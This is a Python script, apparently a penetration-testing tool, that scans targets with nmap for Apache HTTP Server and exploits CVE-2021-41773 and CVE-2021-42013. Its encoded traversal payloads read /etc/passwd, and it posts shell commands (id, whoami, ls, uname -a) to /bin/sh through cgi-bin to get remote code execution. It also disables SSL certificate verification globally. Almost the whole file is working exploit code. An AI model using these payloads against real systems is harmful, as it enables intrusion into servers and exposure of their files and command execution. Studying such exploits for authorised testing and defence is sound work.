import subprocess
import requests
import urllib
import re
import ssl
from urllib.request import Request, urlopen

# User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Bypass SSL certificate verification
ssl._create_default_https_context = ssl._create_unverified_context

def run_nmap_scan(target_ip, target_port=None):
    """Runs an Nmap scan to find services and returns the results."""
    def scan(port_range, additional_args=None):
        nmap_args = ["nmap", "-sV", "-T5", "-Pn", f"-p{port_range}", target_ip]
        if additional_args:
            nmap_args.extend(additional_args)
        try:
            print(f"Running Nmap with arguments: {' '.join(nmap_args)}")
            scan_results = subprocess.run(nmap_args, capture_output=True, text=True, check=True)
            return scan_results.stdout
        except subprocess.CalledProcessError as e:
            print(f"Error running Nmap: {e.stderr}")
            return f"Error running Nmap: {e.stderr}"
        except Exception as e:
            print(f"Unexpected error: {e}")
            return f"Unexpected error: {e}"

    if target_port:
        result = scan(target_port)
        print(f"Scan result for port {target_port}: {result}")
        return filter_apache_services(result)

    # Scan port 80 first
    result = scan("80")
    print(f"Scan result for port 80: {result}")
    filtered_result = filter_apache_services(result)
    print(f"Filtered result for port 80: {filtered_result}")
    if "Apache" in filtered_result:
        return filtered_result

    # Scan port 443 if Apache is not found on port 80
    result = scan("443")
    print(f"Scan result for port 443: {result}")
    filtered_result = filter_apache_services(result)
    print(f"Filtered result for port 443: {filtered_result}")
    if "Apache" in filtered_result:
        return filtered_result

    # Scan all ports if Apache is not found on ports 80 and 443
    result = scan("1-65535")
    print(f"Scan result for all ports: {result}")
    return filter_apache_services(result)

def filter_apache_services(scan_result):
    """Filters and returns only Apache-related lines from the Nmap scan results."""
    apache_lines = []
    for line in scan_result.split('\n'):
        if re.search(r'Apache|httpd', line, re.IGNORECASE):
            apache_lines.append(line)
    return '\n'.join(apache_lines)

def find_apache_ports(scan_result):
    """Finds Apache service ports from the Nmap scan results."""
    apache_ports = []
    for line in scan_result.split('\n'):
        if re.search(r'Apache|httpd', line, re.IGNORECASE):
            match = re.search(r'(\d+)/tcp', line)
            if match:
                apache_ports.append(match.group(1))
    return apache_ports

def urlCheck(url):
    try:
        resp = requests.head(url, headers={"User-Agent": user_agent})
        return resp
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Error connecting to {url}: {e}\n")
        return None

def exploitPT(url, payload, cve_id):
    payload_url = url + urllib.parse.quote(payload, safe="/%")
    print(f"[+] Executing payload {payload_url}")
    try:
        request = urllib.request.Request(payload_url, headers={"User-Agent": user_agent})
        response = urllib.request.urlopen(request)
        res = response.read().decode("utf-8")
        if "root:" in res:
            print(f"[!] {url} is vulnerable to Path Traversal Attack ({cve_id})")
            print("[+] Response:")
            print(res)
            return f"{url} is vulnerable to Path Traversal Attack ({cve_id})\n{res}\n"
        else:
            print(f"[!] {url} is not vulnerable to {cve_id}\n")
    except urllib.error.HTTPError:
        print(f"[!] {url} is not vulnerable to {cve_id}\n")
    return ""

def exploitRCE(url, payload, cve_id):
    payload_url = url + urllib.parse.quote(payload, safe="/%")
    data = "echo;id".encode("ascii")
    print(f"[+] Executing payload {payload_url}")
    try:
        request = urllib.request.Request(payload_url, data=data, headers={"User-Agent": user_agent})
        response = urllib.request.urlopen(request)
        res = response.read().decode("utf-8")
        if "uid=" in res:
            print(f"[!] {url} is vulnerable to Remote Code Execution attack ({cve_id})")
            print("[+] Response:")
            print(res)
            return f"{url} is vulnerable to Remote Code Execution attack ({cve_id})\n{res}\n"
        else:
            print(f"[!] {url} is not vulnerable to {cve_id}\n")
            print("[+] Response:")
            print(res)
    except urllib.error.HTTPError as e:
        print(f"[!] {url} is not vulnerable to {cve_id}\n")
        print(f"[+] HTTPError response: {e.read().decode('utf-8')}")
    except Exception as e:
        print(f"[!] {url} is not vulnerable to {cve_id}\n")
        print(f"[+] Exception: {e}")
    return ""

def pathTraversal(url):
    resp = urlCheck(url)
    if not resp:
        return ""
    version = resp.headers.get('server', '')
    if "49" in version:
        cve_id = "CVE-2021-42013"
        payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
        return exploitPT(url, payload, cve_id)

    elif "50" in version:
        cve_id = "CVE-2021-42013"
        payload = "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
        return exploitPT(url, payload, cve_id)

    return ""

def curlRCE(url):
    curl_commands = [
        "whoami",
        "ls",
        "pwd",
        "uname -a"
    ]
    results = ""
    for command in curl_commands:
        curl_cmd = f"curl '{url}' --data 'echo Content-Type: text/plain; echo; {command}'"
        try:
            print(f"[+] Executing: {curl_cmd}")
            result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True)
            results += f"[+] {command}:\n{result.stdout}\n"
        except subprocess.CalledProcessError as e:
            print(f"Error executing curl command: {e.stderr}")
            results += f"Error executing {command}: {e.stderr}\n"
    return results

def RCE(url):
    resp = urlCheck(url)
    if not resp:
        return ""
    version = resp.headers.get('server', '')
    if "49" in version:
        cve_id = "CVE-2021-41773"
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        return exploitRCE(url, payload, cve_id) + curlRCE(url + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh")

    elif "50" in version:
        cve_id = "CVE-2021-42013"
        payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        return exploitRCE(url, payload, cve_id) + curlRCE(url + "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh")

    return ""

def process_targets(targets):
    results = ""
    for target in targets:
        if ':' in target:
            ip, port = target.split(':')
            url = f"http://{ip}:{port}"
            print(f"[DEBUG] Processing target: {url}")

            # Ensure the service is Apache before exploiting
            resp = urlCheck(url)
            if resp:
                server_header = resp.headers.get('server', '').lower()
                if "apache" in server_header:
                    results += pathTraversal(url)
                    results += RCE(url)

    return results
